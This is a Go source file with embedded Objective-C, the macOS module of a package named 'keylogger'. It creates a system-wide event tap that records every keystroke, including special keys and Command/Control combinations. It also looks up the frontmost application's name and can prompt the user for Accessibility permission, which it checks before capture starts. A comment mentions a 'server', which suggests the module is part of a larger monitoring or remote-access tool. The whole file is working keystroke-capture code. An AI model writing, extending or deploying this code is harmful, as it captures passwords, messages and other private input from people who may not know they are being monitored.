//go:build darwin && !nokeylogger && cgo
// +build darwin,!nokeylogger,cgo

package keylogger

/*
#cgo CFLAGS: -x objective-c
#cgo LDFLAGS: -framework ApplicationServices -framework CoreFoundation -framework AppKit

#include <ApplicationServices/ApplicationServices.h>
#include <CoreFoundation/CoreFoundation.h>
#import <Foundation/Foundation.h>
#import <AppKit/AppKit.h>
#include <stdlib.h>

// Forward declaration — implemented in Go via CGo export.
extern void goOnKey(char *chars, int len, int keyCode, int flags);

// -----------------------------------------------------------------------
// Event tap globals
// -----------------------------------------------------------------------
static CFMachPortRef    _tap      = NULL;
static CFRunLoopSourceRef _tapSrc = NULL;
static CFRunLoopRef     _tapRL    = NULL;

// -----------------------------------------------------------------------
// Keystroke callback
// -----------------------------------------------------------------------
static CGEventRef keyEventCallback(CGEventTapProxy proxy,
                                   CGEventType type,
                                   CGEventRef event,
                                   void *refcon)
{
    if (type == kCGEventKeyDown || type == kCGEventFlagsChanged) {
        UniChar      buf[8];
        UniCharCount actualLen = 0;

        if (type == kCGEventKeyDown) {
            CGEventKeyboardGetUnicodeString(event, 8, &actualLen, buf);
        }

        int keyCode = (int)CGEventGetIntegerValueField(event, kCGKeyboardEventKeycode);
        int flags   = (int)CGEventGetFlags(event);

        if (type == kCGEventKeyDown && actualLen > 0) {
            // Simple UTF-16 -> UTF-8 conversion for BMP characters only
            char utf8[32];
            int  utf8Len = 0;
            for (UniCharCount i = 0; i < actualLen && utf8Len < 28; i++) {
                UniChar c = buf[i];
                if (c < 0x80) {
                    utf8[utf8Len++] = (char)c;
                } else if (c < 0x800) {
                    utf8[utf8Len++] = (char)(0xC0 | (c >> 6));
                    utf8[utf8Len++] = (char)(0x80 | (c & 0x3F));
                } else {
                    utf8[utf8Len++] = (char)(0xE0 | (c >> 12));
                    utf8[utf8Len++] = (char)(0x80 | ((c >> 6) & 0x3F));
                    utf8[utf8Len++] = (char)(0x80 | (c & 0x3F));
                }
            }
            utf8[utf8Len] = '\0';
            goOnKey(utf8, utf8Len, keyCode, flags);
        } else if (type == kCGEventFlagsChanged) {
            goOnKey("", 0, keyCode, flags);
        }
    }
    return event;
}

// -----------------------------------------------------------------------
// createEventTap — phase 1: allocate the tap (does NOT run the loop).
// Returns 0 on success, -1 on failure (no accessibility permission).
// -----------------------------------------------------------------------
static int createEventTap(void) {
    CGEventMask mask = CGEventMaskBit(kCGEventKeyDown) |
                       CGEventMaskBit(kCGEventFlagsChanged);
    _tap = CGEventTapCreate(kCGSessionEventTap,
                            kCGHeadInsertEventTap,
                            kCGEventTapOptionListenOnly,
                            mask,
                            keyEventCallback,
                            NULL);
    if (!_tap) return -1;
    _tapSrc = CFMachPortCreateRunLoopSource(kCFAllocatorDefault, _tap, 0);
    return 0;
}

// -----------------------------------------------------------------------
// runEventTapLoop — phase 2: attach to run loop and block.
// Call from a goroutine that has been locked to an OS thread.
// -----------------------------------------------------------------------
static void runEventTapLoop(void) {
    _tapRL = CFRunLoopGetCurrent();
    CFRunLoopAddSource(_tapRL, _tapSrc, kCFRunLoopCommonModes);
    CGEventTapEnable(_tap, true);
    CFRunLoopRun();
    // Cleanup after loop exits
    CGEventTapEnable(_tap, false);
    CFRunLoopRemoveSource(_tapRL, _tapSrc, kCFRunLoopCommonModes);
    CFRelease(_tapSrc); _tapSrc = NULL;
    CFRelease(_tap);    _tap    = NULL;
    _tapRL = NULL;
}

// -----------------------------------------------------------------------
// stopEventTapLoop — signal the run loop to exit.
// -----------------------------------------------------------------------
static void stopEventTapLoop(void) {
    if (_tapRL) {
        CFRunLoopStop(_tapRL);
    }
}

// -----------------------------------------------------------------------
// Permission helpers
// -----------------------------------------------------------------------
static int checkAccessibility(void) {
    return AXIsProcessTrusted() ? 1 : 0;
}

static int requestAccessibility(void) {
    NSDictionary *opts = @{(__bridge NSString *)kAXTrustedCheckOptionPrompt: @YES};
    return AXIsProcessTrustedWithOptions((__bridge CFDictionaryRef)opts) ? 1 : 0;
}

// -----------------------------------------------------------------------
// Window title helper
// -----------------------------------------------------------------------
static char* getFrontAppName(void) {
    @autoreleasepool {
        NSRunningApplication *app =
            [[NSWorkspace sharedWorkspace] frontmostApplication];
        if (!app) return NULL;
        NSString *name = app.localizedName;
        if (!name || name.length == 0) return NULL;
        return strdup([name UTF8String]);
    }
}
*/
import "C"

import (
	"fmt"
	"log"
	"runtime"
	"sync"
	"unsafe"
)

// keyEvent holds a single key event delivered from the C tap callback.
type keyEvent struct {
	chars   string
	keyCode int
	flags   int
}

// Global channel used by the C callback to deliver events to Go.
// Buffered so the callback never blocks the event tap thread.
var (
	keyEventCh chan keyEvent
	keyEventMu sync.Mutex
)

// goOnKey is called from C when a key event arrives.
//
//export goOnKey
func goOnKey(chars *C.char, length C.int, keyCode C.int, flags C.int) {
	var s string
	if length > 0 && chars != nil {
		s = C.GoStringN(chars, length)
	}
	ev := keyEvent{
		chars:   s,
		keyCode: int(keyCode),
		flags:   int(flags),
	}
	keyEventMu.Lock()
	ch := keyEventCh
	keyEventMu.Unlock()
	if ch != nil {
		select {
		case ch <- ev:
		default:
			// Drop rather than block the callback thread
		}
	}
}

// macOS virtual key codes for special keys
const (
	kVK_Return        = 0x24
	kVK_Delete        = 0x33 // Backspace on Mac
	kVK_Tab           = 0x30
	kVK_Escape        = 0x35
	kVK_ForwardDelete = 0x75
	kVK_LeftArrow     = 0x7B
	kVK_RightArrow    = 0x7C
	kVK_DownArrow     = 0x7D
	kVK_UpArrow       = 0x7E
	kVK_Home          = 0x73
	kVK_End           = 0x77
	kVK_PageUp        = 0x74
	kVK_PageDown      = 0x79
	kVK_F1            = 0x7A
	kVK_F2            = 0x78
	kVK_F3            = 0x63
	kVK_F4            = 0x76
	kVK_F5            = 0x60
	kVK_F6            = 0x61
	kVK_F7            = 0x62
	kVK_F8            = 0x64
	kVK_F9            = 0x65
	kVK_F10           = 0x6D
	kVK_F11           = 0x67
	kVK_F12           = 0x6F

	// CGEventFlags modifier bits
	kCGEventFlagMaskCommand   = 0x00100000
	kCGEventFlagMaskControl   = 0x00040000
	kCGEventFlagMaskAlternate = 0x00080000
)

// Modifier-only key codes — we don't log standalone modifier presses.
var modifierKeyCodes = map[int]bool{
	0x37: true, // Left Command
	0x36: true, // Right Command
	0x38: true, // Left Shift
	0x3C: true, // Right Shift
	0x3A: true, // Left Option/Alt
	0x3D: true, // Right Option/Alt
	0x3B: true, // Left Control
	0x3E: true, // Right Control
	0x39: true, // Caps Lock
}

var specialKeyNames = map[int]string{
	kVK_Return:        "[ENTER]",
	kVK_Delete:        "[BACKSPACE]",
	kVK_Tab:           "[TAB]",
	kVK_Escape:        "[ESC]",
	kVK_ForwardDelete: "[DELETE]",
	kVK_LeftArrow:     "[LEFT]",
	kVK_RightArrow:    "[RIGHT]",
	kVK_DownArrow:     "[DOWN]",
	kVK_UpArrow:       "[UP]",
	kVK_Home:          "[HOME]",
	kVK_End:           "[END]",
	kVK_PageUp:        "[PAGE UP]",
	kVK_PageDown:      "[PAGE DOWN]",
	kVK_F1:            "[F1]",
	kVK_F2:            "[F2]",
	kVK_F3:            "[F3]",
	kVK_F4:            "[F4]",
	kVK_F5:            "[F5]",
	kVK_F6:            "[F6]",
	kVK_F7:            "[F7]",
	kVK_F8:            "[F8]",
	kVK_F9:            "[F9]",
	kVK_F10:           "[F10]",
	kVK_F11:           "[F11]",
	kVK_F12:           "[F12]",
}

func (k *Keylogger) captureKeystrokes() error {
	// Phase 1: try to create the event tap (fails immediately if no permission).
	if ret := C.createEventTap(); ret != 0 {
		return fmt.Errorf("CGEventTap creation failed — accessibility permission required")
	}

	// Phase 2: publish the event channel and run the tap on a locked OS thread.
	keyEventMu.Lock()
	keyEventCh = make(chan keyEvent, 512)
	ch := keyEventCh
	keyEventMu.Unlock()

	tapDone := make(chan struct{})
	go func() {
		defer close(tapDone)
		runtime.LockOSThread()
		defer runtime.UnlockOSThread()
		C.runEventTapLoop() // blocks until stopEventTapLoop() is called
	}()

	log.Printf("[keylogger] macOS CGEventTap running")

	for {
		select {
		case <-k.stopCh:
			C.stopEventTapLoop()
			<-tapDone
			keyEventMu.Lock()
			keyEventCh = nil
			keyEventMu.Unlock()
			return nil
		case ev := <-ch:
			k.handleDarwinEvent(ev)
		}
	}
}

func (k *Keylogger) handleDarwinEvent(ev keyEvent) {
	// Modifier-only events: skip
	if ev.chars == "" && modifierKeyCodes[ev.keyCode] {
		return
	}

	var keyStr string

	if name, ok := specialKeyNames[ev.keyCode]; ok {
		keyStr = name
	} else if ev.chars != "" {
		cmd := ev.flags&kCGEventFlagMaskCommand != 0
		ctrl := ev.flags&kCGEventFlagMaskControl != 0
		alt := ev.flags&kCGEventFlagMaskAlternate != 0

		if cmd || ctrl {
			keyStr = formatDarwinCombo(cmd, ctrl, alt, ev.chars)
		} else {
			keyStr = ev.chars
		}
	}

	if keyStr == "" {
		return
	}

	k.logKey(keyStr)
}

func formatDarwinCombo(cmd, ctrl, alt bool, key string) string {
	s := "["
	if ctrl {
		s += "CTRL+"
	}
	if cmd {
		s += "CMD+"
	}
	if alt {
		s += "ALT+"
	}
	return s + key + "]"
}

// CheckAccessibilityPermission returns true if the process already has
// macOS Accessibility permission.
func CheckAccessibilityPermission() bool {
	return C.checkAccessibility() == 1
}

// RequestAccessibilityPermission displays the macOS system prompt asking the
// user to grant Accessibility permission. Returns true if permission is
// currently granted (either already was or just approved).
func RequestAccessibilityPermission() bool {
	return C.requestAccessibility() == 1
}

func getWindowTitle() string {
	cstr := C.getFrontAppName()
	if cstr == nil {
		return ""
	}
	defer C.free(unsafe.Pointer(cstr))
	return C.GoString(cstr)
}

// NeedsPermissionGate returns true on macOS: the server must request
// accessibility permission before the keylogger can start.
func (k *Keylogger) NeedsPermissionGate() bool {
	return true
}

// RequestPermission triggers the macOS accessibility permission prompt via
// AXIsProcessTrustedWithOptions (CGo path, native build only).
func (k *Keylogger) RequestPermission() bool {
	granted := RequestAccessibilityPermission()
	k.mu.Lock()
	k.permissionGranted = granted
	k.mu.Unlock()
	return granted
}

// HasPermission checks the current accessibility permission state without
// displaying any prompt.
func (k *Keylogger) HasPermission() bool {
	return CheckAccessibilityPermission()
}
